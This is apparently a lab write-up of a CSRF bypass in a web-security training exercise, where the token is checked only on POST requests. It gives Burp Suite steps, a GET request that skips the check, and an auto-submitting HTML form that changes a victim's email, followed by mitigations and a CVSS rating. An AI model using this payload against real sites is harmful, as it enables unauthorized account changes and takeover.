# Title: CSRF: CSRF where token validation depends on request method

## Description

The application is vulnerable to Cross-Site Request Forgery (CSRF) in the email change functionality. Although the application implements CSRF tokens, token validation is inconsistently enforced and depends on the HTTP request method.

The application correctly validates CSRF tokens for POST requests but fails to perform the same validation when the endpoint is accessed using a GET request. As a result, an attacker can bypass the CSRF protection entirely by changing the request method while preserving the state-changing functionality.

This implementation flaw renders the anti-CSRF mechanism ineffective and allows attackers to perform unauthorized actions on behalf of authenticated users.

---

## Steps to Exploit

### 1. Identify the Email Change Request

1. Log in using the provided credentials:

```text id="c6sj1w"
Username: wiener
Password: peter
```

2. Navigate to **My Account**.
3. Update the email address.
4. Intercept the request using Burp Suite.

Example request:

```http id="9dx7u6"
POST /my-account/change-email HTTP/1.1

email=test@example.com
csrf=abc123
```

---

### 2. Verify CSRF Protection

Modify the CSRF token value:

```http id="jm5jnp"
csrf=invalid
```

Forward the request.

The server rejects the request, confirming that CSRF validation is performed for POST requests.

---

### 3. Test Alternate Request Methods

Send the request to Burp Repeater.

Use **Change Request Method** to convert the request from POST to GET.

Example:

```http id="nobz5n"
GET /my-account/change-email?email=test@example.com HTTP/1.1
```

Forward the request.

Observe that the email change succeeds even though no valid CSRF token is supplied.

This confirms that token validation depends on the request method and can be bypassed.

---

### 4. Create a CSRF Proof of Concept

Construct an HTML page that automatically submits a GET request:

```html id="6d1znq"
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

### 5. Host the Exploit

1. Navigate to the exploit server.
2. Paste the HTML payload into the response body.
3. Click **Store**.

---

### 6. Verify the Exploit

1. Click **View Exploit**.
2. Observe that the request is automatically submitted.
3. Confirm that the email address is updated successfully.

---

### 7. Deliver to Victim

1. Change the email address to an attacker-controlled value.
2. Deliver the exploit.
3. When an authenticated victim visits the malicious page, their email address is modified without consent.

---

## Proof of Concept

### Original Protected Request

```http id="5sk2v8"
POST /my-account/change-email

email=test@example.com
csrf=abc123
```

### Bypassed Request

```http id="9fqetm"
GET /my-account/change-email?email=attacker@example.com
```

### CSRF Exploit

```html id="rvphqz"
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
document.forms[0].submit();
</script>
```

### Result

```text id="4v5nl4"
Victim's email address is modified without requiring a valid CSRF token.
```

---

## Impact

* Bypass of implemented CSRF protections.
* Unauthorized modification of user account settings.
* Potential account takeover through email address manipulation.
* Abuse of password reset mechanisms.
* Execution of authenticated actions without user consent.
* Reduced trust in account security controls.

---

## Mitigation / Remediation

### 1. Enforce CSRF Validation Consistently

Validate CSRF tokens for all state-changing requests regardless of HTTP method.

---

### 2. Restrict Sensitive Actions to POST Requests

Ensure that account modification endpoints only accept POST requests.

Example:

```http id="n9kh1w"
POST /my-account/change-email
```

Reject GET requests attempting to modify application state.

---

### 3. Implement SameSite Cookies

Configure session cookies with appropriate SameSite protections.

Example:

```http id="4c5r0n"
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

or

```http id="vmdfyt"
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

---

### 4. Validate Origin and Referer Headers

Verify that requests originate from trusted application domains.

---

### 5. Require Re-authentication

Require password confirmation before processing sensitive account changes.

---

### 6. Conduct Security Testing

Regularly test CSRF protections to ensure they cannot be bypassed using alternate HTTP methods.

---

## CVSS Score

**CVSS v3.1 Score:** 6.5 (Medium)

**Vector:**

```text id="lg4ws7"
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                    |
| ------------------- | --------- | ------------------------------------------------ |
| Attack Vector       | Network   | Exploitable remotely via a malicious webpage     |
| Attack Complexity   | Low       | Requires only a crafted GET request              |
| Privileges Required | None      | Attacker does not require authentication         |
| User Interaction    | Required  | Victim must visit the attacker's page            |
| Scope               | Unchanged | Impact remains within the vulnerable application |
| Confidentiality     | None      | No direct information disclosure                 |
| Integrity           | High      | Unauthorized modification of account information |
| Availability        | None      | No service disruption observed                   |

---

## Conclusion

The application attempts to protect against CSRF attacks using anti-CSRF tokens, but the implementation is flawed because validation is only performed for specific HTTP methods. By switching from POST to GET, an attacker can bypass the protection entirely and perform unauthorized account modifications. This vulnerability demonstrates the importance of enforcing security controls consistently across all request methods.
